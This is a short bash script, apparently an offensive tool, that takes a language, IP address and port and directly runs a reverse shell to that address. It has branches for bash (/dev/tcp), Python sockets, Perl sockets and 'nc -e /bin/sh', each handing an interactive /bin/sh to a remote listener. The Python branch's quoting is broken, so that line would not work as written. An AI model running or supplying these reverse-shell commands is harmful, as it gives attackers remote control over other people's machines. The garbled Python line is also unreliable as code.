#!/bin/bash

# Usage: ./reverse_shell_gen.sh <language> <ip_address> <port>

# Available languages:
#   - bash
#   - python
#   - perl
#   - nc (netcat)

language=$1
ip=$2
port=$3

case "$language" in
    "bash")
        # Bash reverse shell
        # This will send a reverse shell to the specified IP and port,
        # using Bash as the language.
        # The connection will be made as a bash process on the target machine.
        bash -i >& /dev/tcp/$ip/$port 0>&1
        ;;
    "python")
        # Python reverse shell
        # This will send a reverse shell to the specified IP and port,
        # using Python as the language.
        # The connection will be made as a python process on the target machine.
        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"$ip"'","'"$port"'"))';os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
        ;;
    "perl")
        # Perl reverse shell
        # This will send a reverse shell to the specified IP and port,
        # using Perl as the language.
        # The connection will be made as a perl process on the target machine.
        perl -e 'use Socket;$i="'"$ip"'";$p='"$port"';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
        ;;
    "nc")
        # Netcat reverse shell
        # This will send a reverse shell to the specified IP and port,
        # using netcat as the language.
        # The connection will be made as a netcat process on the target machine.
        nc -e /bin/sh $ip $port
        ;;
    *)
        # If an invalid language is specified, print an error message and exit
        echo "Invalid language specified"
        exit 1
        ;;
esac
